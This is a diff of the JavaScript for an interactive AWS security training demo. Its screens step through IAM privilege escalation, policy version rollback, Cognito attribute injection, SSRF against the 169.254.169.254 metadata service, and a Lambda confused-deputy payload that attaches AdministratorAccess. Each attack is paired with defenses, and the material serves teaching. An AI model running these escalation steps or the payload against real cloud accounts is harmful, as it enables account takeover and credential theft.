+<div class="cpan"><div class="cp knows"><div class="cp-label">dev-user's Policy</div><ul><li><code>s3:GetObject</code>, <code>s3:PutObject</code> on one bucket</li><li><code>iam:List*</code>, <code>iam:Get*</code> (read IAM)</li><li><strong style="color:var(--r)"><code>iam:AttachUserPolicy</code> on Resource: *</strong></li></ul></div><div class="cp wants"><div class="cp-label">What This Enables</div><ul><li>Attach <em>any</em> managed policy to <em>any</em> user</li><li>Including <code>AdministratorAccess</code> to themselves</li><li>One API call from full admin</li></ul></div></div>
+<div class="arch mb-24" style="gap:16px;padding:28px">
+<div class="an"><div class="ai aws-iam">${ISVG}</div><div class="an-l">dev-user</div><div class="an-s">Limited scope</div></div>
+<div class="aarr atk">AttachUserPolicy *</div>
+<div class="an vuln"><div class="ai aws-iam" style="color:var(--r)"><svg viewBox="0 0 40 40"><path d="M20 4L6 12v16l14 8 14-8V12L20 4z" fill="none" stroke="currentColor" stroke-width="2"/><text x="20" y="24" text-anchor="middle" font-size="10" font-weight="800" fill="currentColor">ADM</text></svg></div><div class="an-l" style="color:var(--r)">AdministratorAccess</div></div>
+<div class="aarr">→</div>
+<div class="an"><div class="an-l">Full Account</div><div class="an-s">All services</div></div>
+</div>
+<div class="mt-24"><button class="btn btn1" onclick="nav('7.1b')">Run Attack 1 →</button></div></div>`}
+
+function s71b(){return `<div class="scr" data-id="7.1b"><div class="badge">Attack 1 — Exploitation</div><h1 class="ptitle">Enumerate → Discover → Escalate</h1><p class="psub">Three commands. GetCallerIdentity → read the policy → attach AdministratorAccess.</p>
+<div class="split"><div>
+<h3 style="margin-bottom:10px">Attack Flow</h3>
+<div id="a1-findings">
+<div id="a1f1" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--b);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700;margin-bottom:2px">Step 1: Who Am I?</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">sts:GetCallerIdentity → dev-user</div></div>
+<div id="a1f2" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--a);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700;margin-bottom:2px">Step 2: What Can I Do?</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">Found: iam:AttachUserPolicy on Resource: *</div></div>
+<div id="a1f3" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--r);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700;margin-bottom:2px;color:var(--r)">Step 3: Escalation</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">Attached AdministratorAccess to self</div></div>
+</div>
+<div id="a1-fb" class="fb dng mb-16">⚠ dev-user is now FULL ADMIN</div>
+<div class="why-box" id="a1-why"><strong>Design-valid attack.</strong> No exploit, no CVE. AWS did exactly what it was told. The policy allowed AttachUserPolicy on *, so the user attached AdministratorAccess to themselves. The system works. The security design doesn't.</div>
+<button class="btn btn1 mt-16" id="a1-next" onclick="nav('7.2')" disabled>Attack 2: Policy Rollback →</button>
+</div><div>
+<div class="term focus"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">attack-1</span></div><div class="tb2" id="t71b"></div>
+<div class="thint" id="a1h"><span class="hk">↵</span> submit <span style="margin-left:auto">Next: <span class="hc" id="a1hc" onclick="a1Hint()"></span></span></div>
+</div></div></div></div>`}
+
+// ═══ ATTACK 2: Policy Version Rollback ═══
+function s72(){return `<div class="scr" data-id="7.2"><div class="badge">Attack 2 — Policy Version Rollback</div><h1 class="ptitle">5 Versions. 1 Is Dormant Admin.</h1><p class="psub">Current policy looks locked down. The old development version still exists.</p>
+<div class="card mb-20"><h4>Policy Version History</h4><div style="font-size:14px;color:var(--t2);line-height:1.8;margin-top:8px"><strong style="color:var(--r)">v1</strong> → created during development: <code>Action: *, Resource: *</code><br><strong>v2</strong> → tightened for staging<br><strong>v3</strong> → tightened for prod<br><strong>v4</strong> → further restricted<br><strong style="color:var(--g)">v5</strong> → current default (read-only IAM + <code>SetDefaultPolicyVersion</code>)</div></div>
+<div class="cpan"><div class="cp knows"><div class="cp-label">raynor's Current Access (v5)</div><ul><li><code>iam:Get*</code>, <code>iam:List*</code></li><li><code>iam:SetDefaultPolicyVersion</code></li><li>Looks safe on review</li></ul></div><div class="cp wants"><div class="cp-label">Hidden Vulnerability</div><ul><li>v1 still exists: <code>Action: *, Resource: *</code></li><li>v1 was never deleted after tightening</li><li>SetDefaultPolicyVersion can reactivate it</li></ul></div></div><div class="split swr"><div><h3 style="margin-bottom:10px">Findings</h3><div id="rf"><div id="f1" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--b);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700;margin-bottom:2px">User Identified</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">raynor-iam_privesc_by_rollback</div></div><div id="f2" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--b);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700;margin-bottom:2px">Policy Attached</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">cg-raynor-policy</div></div><div id="f3" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--a);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700;margin-bottom:2px">5 Policy Versions</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">v1, v2, v3, v4, v5 (default)</div></div><div id="f4" style="padding:12px 16px;border-radius:var(--rads);border-left:3px solid var(--r);margin-bottom:10px;background:var(--bg2);opacity:0;transform:translateY(8px);transition:all .4s"><div style="font-size:13px;font-weight:700;margin-bottom:2px;color:var(--r)">v1 — Full Admin (Action: *)</div><div style="font-size:12px;color:var(--tm);font-family:var(--mono)">Category #6: Legacy hidden state</div></div></div><div class="why-box" id="why-recon"><strong>Why This Works:</strong> AWS retains all 5 policy versions. v5 (current) includes <code>iam:SetDefaultPolicyVersion</code> — a <em>Category #3 meta-permission</em>. The user can modify which version is active on their own policy.</div><button class="btn btn1 mt-20" id="b73" onclick="nav('7.3')" disabled>Launch Rollback →</button></div><div><div class="term focus"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">iam-recon</span></div><div class="tb2" id="t72"></div><div class="thint" id="rh"><span class="hk">↵</span> submit <span style="margin-left:auto">Next: <span class="hc" id="rhc" onclick="rHint()"></span></span></div></div></div></div></div>`}
+
+function s73(){return `<div class="scr" data-id="7.3"><div class="badge">Attack 2 — Rollback Exploit</div><h1 class="ptitle">Rewind Time</h1><p class="psub">Select the target version and execute the rollback.</p><div id="eb" class="fb dng mb-20">⚠ PRIVILEGE ESCALATED — Full AdministratorAccess</div><div class="split mb-20"><div><h4>Current (v5) — Restricted</h4><div class="pbox mt-8"><div class="phdr safe">v5 · Default</div><div class="pbdy">{<br>&nbsp;&nbsp;<span class="jk">"Action"</span>: [<span class="js">"iam:Get*"</span>, <span class="js">"iam:List*"</span>, <span class="js">"iam:SetDefaultPolicyVersion"</span>],<br>&nbsp;&nbsp;<span class="jk">"Resource"</span>: <span class="js">"*"</span><br>}</div></div></div><div><h4>Target (v1) — <span style="color:var(--r)">Full Admin</span></h4><div class="pbox mt-8"><div class="phdr dng">v1 · Hidden</div><div class="pbdy">{<br>&nbsp;&nbsp;<span class="jk">"Action"</span>: <span class="jd">"*"</span>,<br>&nbsp;&nbsp;<span class="jk">"Resource"</span>: <span class="jd">"*"</span><br>}</div></div></div></div><div class="card mb-20" id="vsel"><h4>Select Target Version</h4><p style="font-size:13px;color:var(--tm);margin-bottom:14px">Choose which version to activate. Each version has different permissions.</p><div style="display:grid;grid-template-columns:repeat(5,1fr);gap:10px"><div class="ocard" onclick="pkV(this,'v5')" style="text-align:center;padding:10px"><div class="oct">v5</div><div class="ocd">Default</div></div><div class="ocard" onclick="pkV(this,'v4')" style="text-align:center;padding:10px"><div class="oct">v4</div><div class="ocd">EC2 Read</div></div><div class="ocard" onclick="pkV(this,'v3')" style="text-align:center;padding:10px"><div class="oct">v3</div><div class="ocd">S3 Read</div></div><div class="ocard" onclick="pkV(this,'v2')" style="text-align:center;padding:10px"><div class="oct">v2</div><div class="ocd">CW Logs</div></div><div class="ocard" onclick="pkV(this,'v1')" style="text-align:center;padding:10px;border-color:rgba(255,71,87,.2)"><div class="oct" style="color:var(--r)">v1</div><div class="ocd" style="color:var(--r)">Admin *:*</div></div></div><div class="epan" id="ve"><h4>Wrong Version</h4><p id="vem"></p><div class="fix">Look for <code>"Action": "*"</code> — only v1 has unrestricted access.</div></div></div><div class="cbox dng" id="ec"><h4 style="color:var(--r)">⚠ Confirm Escalation</h4><p>Set default to <strong>v1</strong> granting full admin. Type <code>ESCALATE</code>.</p><div class="crow"><input class="fi" id="ei" placeholder="Type ESCALATE" autocomplete="off"><button class="btn btn1 btns" id="be" onclick="doEsc()" disabled>Execute</button></div></div><div class="term mt-16"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">escalation</span></div><div class="tb2" id="t73"></div></div><div class="why-box" id="why-esc"><strong>The attacker didn't create anything new. They rewound time.</strong> They activated permissions that already existed but were dormant. Current config looking safe means nothing if the past is still reachable.</div><div class="mt-24"><button class="btn btn1" id="b74" onclick="nav('7.4a')" disabled>Attack 3: Cognito →</button></div></div>`}
+
+function s74a(){return `<div class="scr" data-id="7.4a"><div class="badge">Attack 3 — Cognito Identity Pool Abuse</div><h1 class="ptitle">Unauthenticated → AWS Credentials</h1><p class="psub">Cognito Identity Pools broker between app users and IAM roles. When "Allow unauthenticated" is enabled, anyone gets credentials.</p><div class="arch mb-24" style="gap:16px;padding:32px"><div class="an"><div class="ai aws-cog" style="width:36px;height:36px">${CSVG}</div><div class="an-l">User Pool</div><div class="an-s">Authentication</div></div><div class="aarr">token →</div><div class="an"><div class="ai aws-cog" style="width:36px;height:36px"><svg viewBox="0 0 40 40" width="32" height="32"><rect x="8" y="6" width="24" height="28" rx="4" fill="none" stroke="currentColor" stroke-width="2"/><text x="20" y="22" text-anchor="middle" font-size="10" font-weight="700" fill="currentColor">ID</text></svg></div><div class="an-l">Identity Pool</div><div class="an-s">Role Mapping</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-iam" style="width:36px;height:36px">${ISVG}</div><div class="an-l">IAM Role</div><div class="an-s">Temp Creds (STS)</div></div></div><div class="card mb-24"><h4>The Trust Model</h4><div style="font-size:13px;color:var(--t2);line-height:1.7;margin-top:8px"><strong>Normal flow:</strong> User logs in via User Pool → Identity Pool says "you're authenticated, here are temp credentials for this IAM role" → role lets them access specific resources.<br><br><strong>The dangerous setting:</strong> Identity Pools have "Allow unauthenticated identities." When enabled, <em>anyone — without logging in at all</em> — can request temporary AWS credentials mapped to an "unauthenticated role."<br><br><strong>The idea:</strong> This unauthenticated role would be extremely limited. Maybe read-only public content.<br><strong>The reality in most deployments:</strong> The unauth role was broad during prototyping. Prod launched. Nobody revisited it.</div></div><div class="callout danger"><strong>The Attack:</strong> The Identity Pool ID is often exposed in the app's JavaScript source — it's a client-side identifier, not a secret. With just that ID, the attacker calls <code>cognito-identity:GetId</code> then <code>GetCredentialsForIdentity</code>. No username. No password. No authentication at all. Cognito hands them a badge.</div><div class="cpan"><div class="cp knows"><div class="cp-label">Attacker Has</div><ul><li>Cognito Identity Pool ID (from frontend JS source)</li><li>AWS CLI</li><li>Knowledge that unauth access is enabled</li></ul></div><div class="cp wants"><div class="cp-label">Attacker Wants</div><ul><li>Get AWS credentials without authenticating</li><li>Discover what the unauth role allows</li><li>Enumerate and exfiltrate from there</li></ul></div></div><div class="mt-24"><button class="btn btn1" onclick="nav('7.4')">Begin Cognito Exploit →</button></div></div>`}
+
+function s74(){return `<div class="scr" data-id="7.4"><div class="badge">Cognito Exploit</div><h1 class="ptitle">Cognito Attribute Injection</h1><p class="psub">Bypass validation, inject admin attributes, extract AWS credentials.</p><div class="ptabs"><div class="ptab act" onclick="cogP(1)">1 · Sign-up Bypass</div><div class="ptab" onclick="cogP(2)">2 · Attribute Injection</div><div class="ptab" onclick="cogP(3)">3 · Credential Extraction</div></div><div class="pcont act" id="cp1"><div class="split"><div class="card"><h4>Bypass Email Validation</h4><p style="font-size:13px;color:var(--t2)" class="mb-16">Frontend validates email client-side. Using CLI bypasses it entirely.</p><div class="mb-16"><label class="flbl">Email</label><input class="fi" id="ce" placeholder="attacker@evil.com" autocomplete="off"></div><div class="mb-16"><label class="flbl">Password</label><input class="fi" id="cpw" placeholder="Attack3r!Pass" autocomplete="off"></div><button class="btn btn1" onclick="cogSign()">Sign Up →</button></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">cognito</span></div><div class="tb2" id="tc1"></div></div></div></div></div><div class="pcont" id="cp2"><div class="split"><div class="card"><h4>Inject Admin Attribute</h4><p style="font-size:13px;color:var(--t2)" class="mb-16">The Identity Pool's role mapping checks <code>custom:access</code> for the value <code>admin</code>.</p><div class="mb-16"><label class="flbl">Attribute</label><select class="fsel" id="cat"><option value="">Select...</option><option value="custom:access">custom:access</option><option value="custom:role">custom:role</option><option value="email_verified">email_verified</option></select></div><div class="mb-16"><label class="flbl">Value</label><input class="fi" id="cav" placeholder="admin" autocomplete="off"></div><div class="epan" id="cae"><h4>Wrong Choice</h4><p id="caem"></p><div class="fix">The Identity Pool checks <code>custom:access</code> for exact value <code>admin</code>.</div></div><button class="btn btn1" onclick="cogInj()">Inject →</button></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">cognito</span></div><div class="tb2" id="tc2"></div></div></div></div></div><div class="pcont" id="cp3"><div class="split"><div class="card"><h4>Extract Credentials</h4><p style="font-size:13px;color:var(--t2)" class="mb-16">With admin attribute set, the Identity Pool maps us to the elevated IAM role.</p><button class="btn btn1 mb-16" onclick="cogExt()">Extract →</button><div class="cbox ok" id="ccr"><h4 style="color:var(--g)">Temp Credentials Obtained</h4><div style="font-family:var(--mono);font-size:12px;color:var(--tm);line-height:1.8;margin-top:8px">AccessKeyId: <span style="color:var(--a)">ASIAZ3EXAMPLE7COGNITO</span><br>SecretKey: <span style="color:var(--a)">wJalr+CognitoTemp/K7MDENG</span><br>Token: <span style="color:var(--a)">IQoJb3JpZ2lu...truncated</span></div><div class="why-box vis mt-12"><strong>Why This Works:</strong> The Identity Pool role mapping rule: <code>custom:access == "admin"</code> → AdminRole. We wrote that attribute ourselves. The pool trusts user-writable attributes for authorization — a <em>Category #4: Unsafe Trust</em> misconfiguration.</div></div></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">cognito</span></div><div class="tb2" id="tc3"></div></div></div></div></div><div class="mt-24"><button class="btn btn1" id="b80" onclick="nav('8.0')" disabled>Attack EC2 →</button></div></div>`}
+
+function s80(){return `<div class="scr" data-id="8.0"><div class="badge">Cloud Compute</div><h1 class="ptitle">EC2, IMDS, and the SSRF Chain</h1><p class="psub">How the Instance Metadata Service becomes a credential theft vector.</p><div class="arch mb-24" style="gap:16px;padding:32px"><div class="an"><div class="an-l" style="font-size:11px;color:var(--td)">Attacker</div><div class="ai" style="color:var(--r)"><svg viewBox="0 0 40 40" width="28" height="28"><circle cx="20" cy="14" r="6" fill="none" stroke="currentColor" stroke-width="2"/><path d="M10 34c0-5.5 4.5-10 10-10s10 4.5 10 10" fill="none" stroke="currentColor" stroke-width="2"/></svg></div></div><div class="aarr atk">→ SSRF</div><div class="tb" style="padding:20px 18px"><div class="tb-label">EC2 Instance</div><div class="an vuln"><div class="ai aws-ec2"><svg viewBox="0 0 40 40" width="24" height="24"><rect x="8" y="8" width="24" height="24" rx="3" fill="none" stroke="currentColor" stroke-width="2"/><text x="20" y="23" text-anchor="middle" font-size="9" fill="currentColor">?url=</text></svg></div><div class="an-l">Web App</div></div><div class="aarr">→</div><div class="an"><div class="ai" style="color:var(--cy)"><svg viewBox="0 0 40 40" width="24" height="24"><rect x="8" y="8" width="24" height="24" rx="3" fill="none" stroke="currentColor" stroke-width="2"/><text x="20" y="22" text-anchor="middle" font-size="7" fill="currentColor">169.*</text></svg></div><div class="an-l">IMDS</div></div></div><div class="aarr">→</div><div class="an"><div class="ai aws-s3"><svg viewBox="0 0 40 40" width="24" height="24"><ellipse cx="20" cy="12" rx="10" ry="4" fill="none" stroke="currentColor" stroke-width="2"/><path d="M10 12v14c0 2.2 4.5 4 10 4s10-1.8 10-4V12" fill="none" stroke="currentColor" stroke-width="2"/></svg></div><div class="an-l">S3</div></div></div><div class="card mb-24"><h4>IMDSv1 vs IMDSv2</h4><div style="font-size:13px;color:var(--t2);line-height:1.7;margin-top:8px"><strong style="color:var(--r)">IMDSv1:</strong> Simple HTTP GET to <code>169.254.169.254</code>. No authentication. Any code on the instance — or any SSRF that can reach the link-local address — can steal role credentials.<br><br><strong style="color:var(--g)">IMDSv2:</strong> Requires a PUT request to get a session token first (with a hop limit header), then uses that token. Blocks most SSRF attacks that can't do multi-step flows or are limited to GET requests.</div></div><div class="callout danger"><strong>This Lab Uses IMDSv1.</strong> The web app's <code>?url=</code> parameter lets us proxy requests through the instance to the metadata endpoint at 169.254.169.254 — stealing the IAM role's temporary credentials.</div><div class="mt-24"><button class="btn btn1" onclick="nav('8.1')">Begin SSRF →</button></div></div>`}
+
+function s81(){return `<div class="scr" data-id="8.1"><div class="badge">SSRF Exploitation</div><h1 class="ptitle">SSRF → Credential Theft</h1><p class="psub">Craft payloads, observe responses, chain the attack.</p><div class="cc mb-20" id="sc"><div class="cn" data-i="0"><div class="cib" style="border-color:var(--a);color:var(--a);background:rgba(240,160,48,.06)">URL</div><div class="cl">SSRF</div></div><div class="ca">→</div><div class="cn" data-i="1"><div class="cib" style="border-color:var(--cy);color:var(--cy);background:rgba(34,211,238,.06)">169</div><div class="cl">Metadata</div></div><div class="ca">→</div><div class="cn" data-i="2"><div class="cib" style="border-color:var(--r);color:var(--r);background:rgba(255,71,87,.06)">KEY</div><div class="cl">Creds</div></div><div class="ca">→</div><div class="cn" data-i="3"><div class="cib" style="border-color:var(--g);color:var(--g);background:rgba(0,232,123,.06)">S3</div><div class="cl">Secrets</div></div><div class="ca">→</div><div class="cn" data-i="4"><div class="cib" style="border-color:var(--r);color:#fff;background:var(--r)">ADM</div><div class="cl">Admin</div></div></div><div class="card mb-16" id="sb"><div style="display:flex;align-items:center;gap:10px"><label class="flbl" style="margin:0;white-space:nowrap">URL</label><input class="fi" id="su" style="flex:1" placeholder="Enter SSRF URL..." autocomplete="off"><button class="btn btn1 btns" onclick="doSSRF()">Send →</button></div><div style="font-size:11px;color:var(--td);margin-top:6px">Step <span id="ssn">1</span>/4 — <span id="ssd">Query metadata root</span></div><div class="epan" id="se"><h4>Invalid or Ineffective URL</h4><p id="sem"></p><div class="fix" id="sef"></div></div></div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">ssrf</span></div><div class="tb2" id="t81" style="max-height:320px"></div></div><div class="mt-24"><button class="btn btn1" id="b90" onclick="nav('9.0')" disabled>Lambda Architecture →</button></div></div>`}
+
+function s90(){return `<div class="scr" data-id="9.0"><div class="badge">Serverless <span class="tag tag-home" style="margin-left:8px">Home Assignment</span></div><h1 class="ptitle">The Confused Deputy</h1><p class="psub">Lambda execution roles create an indirect privilege escalation path via PassRole.</p><div class="arch mb-24" style="gap:16px;padding:32px"><div class="an"><div class="ai aws-iam"><svg viewBox="0 0 40 40" width="28" height="28"><circle cx="20" cy="14" r="5" fill="none" stroke="currentColor" stroke-width="2"/><path d="M12 28c0-4.4 3.6-8 8-8s8 3.6 8 8" fill="none" stroke="currentColor" stroke-width="2"/></svg></div><div class="an-l">Chris</div><div class="an-s">Limited IAM</div></div><div class="aarr">assume →</div><div class="an"><div class="ai aws-iam">${ISVG}</div><div class="an-l">lambdaManager</div><div class="an-s">Create + PassRole</div></div><div class="aarr">pass role →</div><div class="an vuln"><div class="ai aws-lam">${LSVG}</div><div class="an-l">Lambda</div><div class="an-s">Runs as cg-debug</div></div><div class="aarr atk">⚡</div><div class="an" style="border-color:rgba(255,71,87,.4)"><div class="ai aws-iam">${ISVG}</div><div class="an-l" style="color:var(--r)">cg-debug</div><div class="an-s" style="color:var(--r)">AdminAccess</div></div></div><div class="card mb-24"><h4>Why This Is Category #5: Indirect Privilege Path</h4><p style="font-size:13px;color:var(--t2);margin-top:8px;line-height:1.6">Chris can't assume <code>cg-debug</code> directly — its trust policy only allows the Lambda service. But Chris can assume <code>lambdaManager</code>, which has <code>lambda:CreateFunction</code> + <code>iam:PassRole</code>. By creating a Lambda with <code>cg-debug</code> as its execution role, the Lambda service assumes cg-debug on Chris's behalf. The Lambda code then runs admin-level IAM operations — a classic confused deputy.</p></div><div class="mt-24"><button class="btn btn1" onclick="nav('9.1')">Begin Lambda Attack →</button></div></div>`}
+
+function s91(){return `<div class="scr" data-id="9.1"><div class="badge">Lambda Exploitation</div><h1 class="ptitle">Malicious Lambda Deployment</h1><p class="psub">Select execution role, deploy payload, invoke to escalate.</p><div class="split"><div><h4>Payload</h4><div class="ceditor mt-8 mb-16"><div class="ceditor-h"><span>📄</span> lambda_escalate.py</div><div class="ceditor-b"><span class="kw">import</span> <span class="vr">boto3</span><br><br><span class="kw">def</span> <span class="fn">lambda_handler</span>(<span class="vr">event</span>, <span class="vr">context</span>):<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="vr">iam</span> = <span class="vr">boto3</span>.<span class="fn">client</span>(<span class="st">'iam'</span>)<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="vr">iam</span>.<span class="fn">attach_user_policy</span>(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="vr">UserName</span>=<span class="st">'chris-lambda_privesc_cgid'</span>,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="vr">PolicyArn</span>=<span class="st">'arn:aws:iam::aws:policy/AdministratorAccess'</span><br>&nbsp;&nbsp;&nbsp;&nbsp;)<br>&nbsp;&nbsp;&nbsp;&nbsp;<span class="kw">return</span> <span class="st">"Policy attached"</span></div></div><h4>Execution Role</h4><div style="display:grid;gap:8px;margin-top:8px"><div class="ocard" onclick="pkLR(this,'mgr')" style="margin-bottom:0"><div class="oct">cg-lambdaManager</div><div class="ocd">Create/invoke Lambda. Cannot modify IAM directly.</div></div><div class="ocard" onclick="pkLR(this,'dbg')" style="margin-bottom:0;border-color:rgba(255,71,87,.15)"><div style="display:flex;align-items:center;gap:8px"><div class="oct">cg-debug</div><span class="tag tag-crit">AdminAccess</span></div><div class="ocd">AdminAccess policy. Trust: Lambda service only.</div></div></div><div class="epan" id="lre"><h4>Wrong Role — Runtime Failure</h4><p><code>cg-lambdaManager</code> can create Lambda functions, but <strong>cannot call <code>iam:AttachUserPolicy</code></strong>. The function deploys and invokes, but the boto3 call inside fails with <code>AccessDeniedException</code>.</p><div class="fix">Select <strong>cg-debug</strong> — it has AdminAccess and can be assumed by the Lambda service.</div></div><button class="btn btn1 mt-16" id="bdep" onclick="depLam()" disabled>Deploy & Invoke →</button></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">lambda</span></div><div class="tb2" id="t91"></div></div><div id="lok" class="fb ok mt-16">✓ AdministratorAccess attached to chris-lambda_privesc_cgid</div></div></div><div class="mt-24"><button class="btn btn1" id="b100" onclick="nav('10.0')" disabled>Cleanup →</button></div></div>`}
+
+function s100(){return `<div class="scr" data-id="10.0"><div class="badge">Cloud-Nuke</div><h1 class="ptitle">Resource Cleanup</h1><p class="psub">Destroy all lab resources to avoid charges.</p><div class="split"><div><div class="card mb-16"><h4>Select Region</h4><div class="mt-8"><select class="fsel" id="nr"><option value="">Select...</option><option value="us-east-1">us-east-1 (N. Virginia)</option><option value="us-west-2">us-west-2 (Oregon)</option><option value="eu-west-1">eu-west-1 (Ireland)</option></select></div><div class="epan" id="nre"><h4>Wrong Region</h4><p>No lab resources found. Workshop deployed to <strong>us-east-1</strong>.</p><div class="fix">Select <strong>us-east-1</strong>.</div></div></div><div class="cbox dng" id="nc"><h4 style="color:var(--r)">⚠ Destructive Action</h4><p>Permanently delete all resources. Type <code>nuke</code>.</p><div class="crow"><input class="fi" id="ni" placeholder="Type nuke" autocomplete="off"><button class="btn btn1 btns" id="bn" onclick="doNk()" disabled>Nuke →</button></div></div></div><div><h4>Deletion Progress</h4><div class="card mt-8"><div class="ni"><div class="nlbl" style="color:var(--b)">IAM</div><div class="nbg"><div class="nf" id="nk-i"></div></div><div class="ns" id="nk-is">—</div></div><div class="ni"><div class="nlbl" style="color:var(--o)">Cognito</div><div class="nbg"><div class="nf" id="nk-c"></div></div><div class="ns" id="nk-cs">—</div></div><div class="ni"><div class="nlbl" style="color:var(--a)">EC2</div><div class="nbg"><div class="nf" id="nk-e"></div></div><div class="ns" id="nk-es">—</div></div><div class="ni"><div class="nlbl" style="color:var(--g)">S3</div><div class="nbg"><div class="nf" id="nk-s"></div></div><div class="ns" id="nk-ss">—</div></div><div class="ni"><div class="nlbl" style="color:var(--p)">Lambda</div><div class="nbg"><div class="nf" id="nk-l"></div></div><div class="ns" id="nk-ls">—</div></div></div><div id="nd" class="fb ok mt-16">✓ All Resources Destroyed</div><div class="term mt-16"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">cloud-nuke</span></div><div class="tb2" id="t10"></div></div></div></div><div class="mt-30 tc"><button class="btn btn1" id="bkc" onclick="nav('11')" disabled>Kill Chain →</button></div></div>`}
+
+function s11s(){return `<div class="scr" data-id="11"><div class="badge">Complete Attack Path</div><h1 class="ptitle">Full Kill Chain</h1><p class="psub">One identity, six trust boundaries, total compromise.</p><div class="kcg" id="kc"><div class="kcp ph-r"><div class="kcl">Recon</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>IAM Enumeration <span class="tag tag-iam" style="margin-left:6px">IAM</span></h4><p>Found 5 policy versions. v1 has Action:* Resource:*.</p><div style="font-size:11px;color:var(--td);margin-top:4px">Misconfig: #6 Legacy State · #3 Meta-Permission</div></div></div><div class="kcp ph-e"><div class="kcl">Exploit</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>Policy Rollback <span class="tag tag-iam" style="margin-left:6px">IAM</span></h4><p>Set default to v1 — instant admin escalation.</p><div style="font-size:11px;color:var(--g);margin-top:4px">Defense: Restrict SetDefaultPolicyVersion, delete old versions</div></div></div><div class="kcp ph-e"><div class="kcl">Exploit</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>Cognito Injection <span class="tag tag-cog" style="margin-left:6px">Cognito</span></h4><p>Bypassed validation, injected admin attribute, extracted temp creds.</p><div style="font-size:11px;color:var(--g);margin-top:4px">Defense: Server-side validation, don't trust user-writable attributes</div></div></div><div class="kcp ph-s"><div class="kcl">Escalate</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>EC2 SSRF <span class="tag tag-ec2" style="margin-left:6px">EC2</span></h4><p>SSRF → metadata → stole IAM role credentials.</p><div style="font-size:11px;color:var(--g);margin-top:4px">Defense: Enforce IMDSv2, sanitize URL parameters</div></div></div><div class="kcp ph-x"><div class="kcl">Exfiltrate</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>S3 Exfiltration <span class="tag tag-s3" style="margin-left:6px">S3</span></h4><p>Downloaded admin creds from secret bucket.</p><div style="font-size:11px;color:var(--g);margin-top:4px">Defense: Least-privilege roles, encrypt with KMS, no plaintext creds</div></div></div><div class="kcp ph-i"><div class="kcl">Impact</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>Lambda Escalation <span class="tag tag-lam" style="margin-left:6px">Lambda</span></h4><p>Confused deputy → AdministratorAccess → full takeover.</p><div style="font-size:11px;color:var(--g);margin-top:4px">Defense: Restrict PassRole, permission boundaries, least-privilege execution roles</div></div></div></div><div class="mt-24 tc"><button class="btn btn2" onclick="nav('1')">↺ Restart Demo</button></div></div>`}
+
+// ═══ INTERACTION HANDLERS ═══
+function initScr(id){
+  const m={'1':()=>cntUp('[data-id="1"]'),'2':()=>cntUp('[data-id="2"]'),'4.3':initCLI,'5.3':initTZ,'7.1b':initAtk1,'7.2':initRecon,'7.3':initEsc,'8.1':initSSRF,'10.0':initNk,'11':initKC};
   if(m[id])m[id]();
 }
 
-// ═══ ATTACK 1: DISCOVERY ═══
-const A1C=[
-{c:'aws sts get-caller-identity',h:'aws sts get-caller-identity'},
-{c:'aws iam list-attached-user-policies --user-name dev-user',h:'aws iam list-attached-user-policies ...'},
-{c:'aws iam get-policy-version --policy-arn arn:aws:iam::012345678901:policy/dev-app-policy --version-id v1',h:'aws iam get-policy-version ...'}
+function toggleMC(id){const el=$(id);if(el)el.classList.toggle('vis')}
+function chkPre(t){const v={aws:'aws-cli/2.15.17',py:'Python 3.11.7',tf:'Terraform v1.7.3',git:'git 2.43.0'};$(`pre-${t}`).innerHTML=`<span style="color:var(--g);font-size:13px;font-family:var(--mono)">✓ ${v[t]}</span>`;toast(`${t} verified`,'success')}
+
